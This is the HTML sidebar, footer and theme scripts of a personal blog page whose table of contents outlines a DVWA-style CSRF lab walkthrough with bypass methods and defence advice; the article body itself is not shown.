href="#%E6%96%B9%E6%B3%951%EF%BC%9A%E6%9E%84%E9%80%A0%E6%81%B6%E6%84%8F%E9%93%BE%E6%8E%A5"><span class="nav-number">3.4.1.</span> <span class="nav-text">方法1：构造恶意链接</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%952%EF%BC%9A%E8%87%AA%E5%8A%A8%E6%94%BB%E5%87%BB%EF%BC%88%E6%97%A0%E9%9C%80%E7%82%B9%E5%87%BB%EF%BC%89"><span class="nav-number">3.4.2.</span> <span class="nav-text">方法2：自动攻击（无需点击）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%953%EF%BC%9A%E4%BD%BF%E7%94%A8iframe%E9%9A%90%E8%97%8F%E6%94%BB%E5%87%BB"><span class="nav-number">3.4.3.</span> <span class="nav-text">方法3：使用iframe隐藏攻击</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%954%EF%BC%9A%E4%BD%BF%E7%94%A8JavaScript%E8%87%AA%E5%8A%A8%E6%8F%90%E4%BA%A4"><span class="nav-number">3.4.4.</span> <span class="nav-text">方法4：使用JavaScript自动提交</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9E%E6%88%98%E6%BC%94%E7%A4%BA"><span class="nav-number">3.5.</span> <span class="nav-text">实战演示</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Medium-%E9%9A%BE%E5%BA%A6"><span class="nav-number">4.</span> <span class="nav-text">Medium 难度</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E7%9B%AE%E6%A0%87-1"><span class="nav-number">4.1.</span> <span class="nav-text">攻击目标</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8E%E7%AB%AF%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-1"><span class="nav-number">4.2.</span> <span class="nav-text">后端代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B0%E5%A2%9E%E9%98%B2%E6%8A%A4"><span class="nav-number">4.3.</span> <span class="nav-text">新增防护</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%8D%E5%AD%98%E5%9C%A8%E7%9A%84%E6%BC%8F%E6%B4%9E"><span class="nav-number">4.4.</span> <span class="nav-text">仍存在的漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="nav-number">4.5.</span> <span class="nav-text">绕过方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%951%EF%BC%9A%E6%96%87%E4%BB%B6%E5%90%8D%E5%8C%85%E5%90%AB%E7%9B%AE%E6%A0%87%E5%9F%9F%E5%90%8D"><span class="nav-number">4.5.1.</span> <span class="nav-text">方法1：文件名包含目标域名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%952%EF%BC%9A%E7%9B%AE%E5%BD%95%E5%90%8D%E5%8C%85%E5%90%AB%E7%9B%AE%E6%A0%87%E5%9F%9F%E5%90%8D"><span class="nav-number">4.5.2.</span> <span class="nav-text">方法2：目录名包含目标域名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%953%EF%BC%9A%E6%9F%A5%E8%AF%A2%E5%8F%82%E6%95%B0%E5%8C%85%E5%90%AB%E7%9B%AE%E6%A0%87%E5%9F%9F%E5%90%8D"><span class="nav-number">4.5.3.</span> <span class="nav-text">方法3：查询参数包含目标域名</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#High-%E9%9A%BE%E5%BA%A6"><span class="nav-number">5.</span> <span class="nav-text">High 难度</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E7%9B%AE%E6%A0%87-2"><span class="nav-number">5.1.</span> <span class="nav-text">攻击目标</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8E%E7%AB%AF%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-2"><span class="nav-number">5.2.</span> <span class="nav-text">后端代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B0%E5%A2%9E%E9%98%B2%E6%8A%A4-1"><span class="nav-number">5.3.</span> <span class="nav-text">新增防护</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%8D%E5%AD%98%E5%9C%A8%E7%9A%84%E6%BC%8F%E6%B4%9E-1"><span class="nav-number">5.4.</span> <span class="nav-text">仍存在的漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95-1"><span class="nav-number">5.5.</span> <span class="nav-text">绕过方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%951%EF%BC%9A%E7%BB%93%E5%90%88XSS%E6%BC%8F%E6%B4%9E"><span class="nav-number">5.5.1.</span> <span class="nav-text">方法1：结合XSS漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%952%EF%BC%9A%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6"><span class="nav-number">5.5.2.</span> <span class="nav-text">方法2：社会工程学</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Impossible-%E9%9A%BE%E5%BA%A6"><span class="nav-number">6.</span> <span class="nav-text">Impossible 难度</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E7%9B%AE%E6%A0%87-3"><span class="nav-number">6.1.</span> <span class="nav-text">攻击目标</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8E%E7%AB%AF%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-3"><span class="nav-number">6.2.</span> <span class="nav-text">后端代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%8C%E5%96%84%E7%9A%84%E9%98%B2%E6%8A%A4%E6%9C%BA%E5%88%B6"><span class="nav-number">6.3.</span> <span class="nav-text">完善的防护机制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E6%97%A0%E6%B3%95%E6%94%BB%E7%A0%B4%EF%BC%9F"><span class="nav-number">6.4.</span> <span class="nav-text">为什么无法攻破？</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE"><span class="nav-number">7.</span> <span class="nav-text">防御建议</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%B1%82%E9%9D%A2"><span class="nav-number">7.1.</span> <span class="nav-text">代码层面</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E4%BD%BF%E7%94%A8CSRF-Token%EF%BC%88%E6%8E%A8%E8%8D%90%EF%BC%89"><span class="nav-number">7.1.1.</span> <span class="nav-text">1. 使用CSRF Token（推荐）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E9%AA%8C%E8%AF%81Referer%E5%A4%B4%EF%BC%88%E8%BE%85%E5%8A%A9%EF%BC%89"><span class="nav-number">7.1.2.</span> <span class="nav-text">2. 验证Referer头（辅助）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E4%BD%BF%E7%94%A8SameSite-Cookie%E5%B1%9E%E6%80%A7"><span class="nav-number">7.1.3.</span> <span class="nav-text">3. 使用SameSite Cookie属性</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-%E9%AA%8C%E8%AF%81%E5%85%B3%E9%94%AE%E6%93%8D%E4%BD%9C%E5%AF%86%E7%A0%81"><span class="nav-number">7.1.4.</span> <span class="nav-text">4. 验证关键操作密码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-%E4%BD%BF%E7%94%A8POST%E8%80%8C%E9%9D%9EGET"><span class="nav-number">7.1.5.</span> <span class="nav-text">5. 使用POST而非GET</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A1%86%E6%9E%B6%E5%B1%82%E9%9D%A2"><span class="nav-number">7.2.</span> <span class="nav-text">框架层面</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Laravel%E7%A4%BA%E4%BE%8B"><span class="nav-number">7.2.1.</span> <span class="nav-text">Laravel示例</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Django%E7%A4%BA%E4%BE%8B"><span class="nav-number">7.2.2.</span> <span class="nav-text">Django示例</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9E%B6%E6%9E%84%E5%B1%82%E9%9D%A2"><span class="nav-number">7.3.</span> <span class="nav-text">架构层面</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93%E5%AF%B9%E6%AF%94"><span class="nav-number">8.</span> <span class="nav-text">总结对比</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E6%88%98%E5%BB%BA%E8%AE%AE"><span class="nav-number">9.</span> <span class="nav-text">实战建议</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="caixuya"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">caixuya</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">46</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Caixuya" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Caixuya" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:214089030@qq.com" title="E-Mail → mailto:214089030@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">粤ICP备20064368号-1 </a>
+  </div>
+
+<div class="copyright">
+  
+  &copy; 2020 – 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">caixuya</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="Symbols count total">374k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="Reading time total">5:40</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/undefined/anime.min.js"></script>
+  <script src="/undefined/pjax/pjax.min.js"></script>
+  <script src="//cdn.jsdelivr.net/jquery/2.1.3/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/fancybox/2.1.5/jquery.fancybox.pack.js"></script>
+
+<script src="/js/utils.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="//cdn.jsdelivr.net/npm/algoliasearch@4/dist/algoliasearch-lite.umd.js"></script>
+<script src="//cdn.jsdelivr.net/npm/instantsearch.js@4/dist/instantsearch.production.min.js"></script>
+<script src="/js/algolia-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+
+    </div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
